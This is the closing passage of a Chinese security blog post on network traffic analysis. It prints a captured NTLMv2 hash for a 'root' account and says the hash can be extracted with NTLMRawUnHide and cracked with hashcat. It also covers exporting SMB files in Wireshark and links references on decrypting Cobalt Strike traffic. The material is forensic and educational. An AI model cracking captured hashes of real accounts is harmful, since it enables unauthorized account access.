<pre tabindex="0"><code>root::.:924ca077500cd533:e43ae3e491ffe96bca5383b9c0bc4946:0101000000000000b6ca87356b64dc01eca054741fa479e600000000020008004b0041004c004900010008004b0041004c00490004000000030008006b0061006c00690007000800b6ca87356b64dc0106000400020000000800300030000000000000000100000000200000e5528e00f4d9b3bf475abbb1d4e90ac0163587fccd7d2e8aafdb9b455327e48d0a001000000000000000000000000000000000000900260063006900660073002f003100390032002e003100360038002e00350030002e003100320038000000000000000000
</code></pre><p>也可以直接通过NTLMv2 hash抓取工具NTLMRawUnHide来直接获取哈希：</p>
<p><img alt="alt" loading="lazy" src="/images/%E6%B5%81%E9%87%8F%E5%88%86%E6%9E%90/52.png"></p>
<p>hashcat爆破密码：</p>
<p><img alt="alt" loading="lazy" src="/images/%E6%B5%81%E9%87%8F%E5%88%86%E6%9E%90/49.png"></p>
<p>如果要查看通过SMB传输的文件，在wireshark中导出SMB对象即可：</p>
<p><img alt="alt" loading="lazy" src="/images/%E6%B5%81%E9%87%8F%E5%88%86%E6%9E%90/51.png"></p>
<p>参考资料：</p>
<p><a href="https://goodlunatic.github.io/posts/5422d65/">https://goodlunatic.github.io/posts/5422d65/</a></p>
<p><a href="https://www.ddosi.org/cobaltstrike/">https://www.ddosi.org/cobaltstrike/</a></p>
<p><a href="https://xz.aliyun.com/news/3607">https://xz.aliyun.com/news/3607</a></p>
<p><a href="https://www.ddosi.org/cs-decrypt-1/">https://www.ddosi.org/cs-decrypt-1/</a></p>
<p><a href="https://www.ddosi.org/cs-decrypt-2/">https://www.ddosi.org/cs-decrypt-2/</a></p>
<p><a href="https://www.secpulse.com/archives/106276.html">https://www.secpulse.com/archives/106276.html</a></p>


  </div>

  <footer class="post-footer">
    <ul class="post-tags">
    </ul>
  </footer>
</article>
    </main>
    
<footer class="footer">
        <span>&copy; 2025 <a href="https://z9nn8w.github.io/">w8nn9z Blog</a></span> · 

    <span>
        Powered by
        <a href="https://gohugo.io/" rel="noopener noreferrer" target="_blank">Hugo</a> &
        <a href="https://github.com/adityatelange/hugo-PaperMod/" rel="noopener" target="_blank">PaperMod</a>
    </span>
</footer>
<a href="#top" aria-label="go to top" title="Go to Top (Alt + G)" class="top-link" id="top-link" accesskey="g">
    <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 12 6" fill="currentColor">
        <path d="M12 6H0l6-6z" />
    </svg>
</a>

<script>
    let menu = document.getElementById('menu')
    if (menu) {
        menu.scrollLeft = localStorage.getItem("menu-scroll-position");
        menu.onscroll = function () {
            localStorage.setItem("menu-scroll-position", menu.scrollLeft);
        }
    }

    document.querySelectorAll('a[href^="#"]').forEach(anchor => {
        anchor.addEventListener("click", function (e) {
            e.preventDefault();
            var id = this.getAttribute("href").substr(1);
            if (!window.matchMedia('(prefers-reduced-motion: reduce)').matches) {
                document.querySelector(`[id='${decodeURIComponent(id)}']`).scrollIntoView({
                    behavior: "smooth"
                });
            } else {
                document.querySelector(`[id='${decodeURIComponent(id)}']`).scrollIntoView();
            }
            if (id === "top") {
                history.replaceState(null, null, " ");
            } else {
                history.pushState(null, null, `#${id}`);
            }
        });
    });

</script>
<script>
    var mybutton = document.getElementById("top-link");
    window.onscroll = function () {
        if (document.body.scrollTop > 800 || document.documentElement.scrollTop > 800) {
            mybutton.style.visibility = "visible";
            mybutton.style.opacity = "1";
        } else {
            mybutton.style.visibility = "hidden";
            mybutton.style.opacity = "0";
        }
    };

</script>
<script>
    document.getElementById("theme-toggle").addEventListener("click", () => {
        if (document.body.className.includes("dark")) {
            document.body.classList.remove('dark');
            localStorage.setItem("pref-theme", 'light');
        } else {
            document.body.classList.add('dark');
            localStorage.setItem("pref-theme", 'dark');
        }
    })

</script>
</body>

</html>
